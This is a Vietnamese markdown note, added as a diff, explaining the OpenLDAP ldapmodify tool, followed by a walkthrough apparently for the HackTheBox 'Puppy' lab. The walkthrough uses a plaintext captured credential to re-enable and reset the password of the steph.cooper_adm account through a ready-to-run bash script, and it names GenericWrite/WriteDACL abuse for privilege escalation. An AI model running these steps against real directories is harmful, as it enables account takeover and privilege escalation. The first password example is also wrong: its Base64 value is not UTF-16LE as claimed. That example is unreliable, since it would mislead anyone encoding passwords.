@@ -1,0 +1,182 @@
+🧰 1. Giới thiệu ldapmodify là gì?
+
+ldapmodify là công cụ dòng lệnh dùng để:
+
+    Thêm, sửa, hoặc xóa dữ liệu trong hệ thống LDAP (Lightweight Directory Access Protocol)
+
+    Là một phần của OpenLDAP tools, hoạt động được trên cả Linux và hệ thống tương thích LDAP (như AD).
+
+⚙️ 2. Cú pháp cơ bản
+
+ldapmodify -x -H ldap://<host> -D "<bind_dn>" -w <password> -f <file.ldif>
+
+Tham số	Ý nghĩa
+-x	Dùng xác thực đơn giản (simple bind)
+-H	Địa chỉ LDAP server (ldap:// hoặc ldaps://)
+-D	DN (Distinguished Name) của user dùng để xác thực
+-w	Mật khẩu
+-f	Tệp LDIF chứa nội dung thay đổi
+📄 3. Cấu trúc tệp .ldif
+✅ Thay đổi thuộc tính
+
+dn: CN=someuser,CN=Users,DC=example,DC=com
+changetype: modify
+replace: displayName
+displayName: New Display Name
+
+➕ Thêm thuộc tính mới
+
+dn: CN=someuser,CN=Users,DC=example,DC=com
+changetype: modify
+add: description
+description: This is a new description
+
+❌ Xóa thuộc tính
+
+dn: CN=someuser,CN=Users,DC=example,DC=com
+changetype: modify
+delete: description
+
+🔐 4. Reset mật khẩu (Active Directory)
+⚠️ Mật khẩu phải ở định dạng UTF-16LE và có dấu " bao quanh, sau đó Base64 encode nếu dùng trong LDIF.
+
+Ví dụ đặt mật khẩu Pass123!:
+
+dn: CN=someuser,CN=Users,DC=example,DC=com
+changetype: modify
+replace: unicodePwd
+unicodePwd:: IlBhc3MxMjMhIg==
+
+Giải thích:
+
+    "Pass123!" → mã hóa UTF-16LE → Base64 → IlBhc3MxMjMhIg==
+
+🔁 5. Kích hoạt hoặc vô hiệu hóa tài khoản
+
+    Kích hoạt: userAccountControl: 512
+
+    Vô hiệu hóa: userAccountControl: 514
+
+dn: CN=someuser,CN=Users,DC=example,DC=com
+changetype: modify
+replace: userAccountControl
+userAccountControl: 512
+
+🧠 6. Các giá trị userAccountControl phổ biến
+Giá trị	Ý nghĩa
+512	Normal account (active)
+514	Disabled account
+544	Account + Password not required
+66048	Account + Password never expires
+🛡️ 7. Kiểm soát nâng cao (ACL, group, multi-attr)
+✔️ Thêm người dùng vào nhóm
+
+dn: CN=SomeGroup,CN=Users,DC=example,DC=com
+changetype: modify
+add: member
+member: CN=someuser,CN=Users,DC=example,DC=com
+
+❌ Xóa người khỏi nhóm
+
+dn: CN=SomeGroup,CN=Users,DC=example,DC=com
+changetype: modify
+delete: member
+member: CN=someuser,CN=Users,DC=example,DC=com
+
+🧪 8. Thử nghiệm trực tiếp
+
+Giả sử bạn có domain puppy.htb, user levi.james, bạn có thể:
+🔄 Kích hoạt tài khoản steph.cooper_adm:
+
+File: enable.ldif
+
+dn: CN=steph.cooper_adm,CN=Users,DC=puppy,DC=htb
+changetype: modify
+replace: userAccountControl
+userAccountControl: 512
+
+Lệnh chạy:
+
+ldapmodify -x -H ldap://10.10.11.70 -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -f enable.ldif
+
+🔎 9. Lỗi phổ biến & xử lý
+Lỗi	Nguyên nhân
+Insufficient access	Tài khoản không đủ quyền (chưa có quyền modify object)
+Constraint violation	Đặt sai định dạng thuộc tính (VD: mật khẩu sai định dạng Base64/UTF-16)
+Invalid DN syntax	DN sai định dạng
+No such object	Không tìm thấy DN cần chỉnh sửa
+✅ Tổng kết
+Mức độ	Kỹ năng
+Cơ bản	Thay đổi thông tin (tên hiển thị, mô tả), kích hoạt user
+Trung bình	Reset mật khẩu, thêm vào group, xóa thuộc tính
+Nâng cao	Kịch bản tự động hóa sửa LDAP, khai thác quyền GenericWrite, WriteDACL, hỗ trợ privilege escalation
+
+
+
+
+=====================================================================================================================================================================================================
+
+
+
+
+Dưới đây là hướng dẫn tạo file .ldif và script chạy ldapmodify để:
+
+    ✅ Kích hoạt tài khoản steph.cooper_adm
+
+    ✅ Đặt lại mật khẩu (ví dụ NewPassw0rd!)
+
+📁 1. Tạo file enable_user.ldif – Kích hoạt tài khoản
+
+Nội dung:
+
+dn: CN=steph.cooper_adm,CN=Users,DC=puppy,DC=htb
+changetype: modify
+replace: userAccountControl
+userAccountControl: 512
+
+🔑 2. Tạo file reset_password.ldif – Đặt lại mật khẩu
+
+Giả sử bạn muốn đặt mật khẩu: NewPassw0rd!
+Bước 1: Tạo mật khẩu Base64 (UTF-16LE và có dấu ngoặc kép " ")
+
+Chạy lệnh sau để chuyển chuỗi "NewPassw0rd!" sang Base64 UTF-16LE:
+
+echo -n '"NewPassw0rd!"' | iconv -f UTF-8 -t UTF-16LE | base64
+
+✅ Ví dụ output:
+
+IgBOAGUAdwBQAGEAcwBzAHcAMAByAGQAIQAiAA==
+
+Bước 2: Tạo file reset_password.ldif
+
+dn: CN=steph.cooper_adm,CN=Users,DC=puppy,DC=htb
+changetype: modify
+replace: unicodePwd
+unicodePwd:: IgBOAGUAdwBQAGEAcwBzAHcAMAByAGQAIQAiAA==
+
+    Lưu ý: dấu :: sau unicodePwd để báo là giá trị base64.
+
+🧪 3. Script Bash chạy cả 2 file
+
+File: apply_changes.sh
+
+#!/bin/bash
+
+LDAP_SERVER="ldap://10.10.11.70"
+BIND_DN="levi.james@puppy.htb"
+PASSWORD="KingofAkron2025!"
+
+echo "[*] Kích hoạt tài khoản steph.cooper_adm..."
+ldapmodify -x -H $LDAP_SERVER -D "$BIND_DN" -w "$PASSWORD" -f enable_user.ldif
+
+echo "[*] Đặt lại mật khẩu tài khoản steph.cooper_adm..."
+ldapmodify -x -H $LDAP_SERVER -D "$BIND_DN" -w "$PASSWORD" -f reset_password.ldif
+
+🔓 Cấp quyền và chạy
+
+chmod +x apply_changes.sh
+./apply_changes.sh
+
+🛡️ Gợi ý bảo mật
+
+Không nên để mật khẩu rõ ràng (KingofAkron2025!) trong script nếu dùng thật – bạn nên dùng biến môi trường hoặc file riêng chứa mật khẩu.
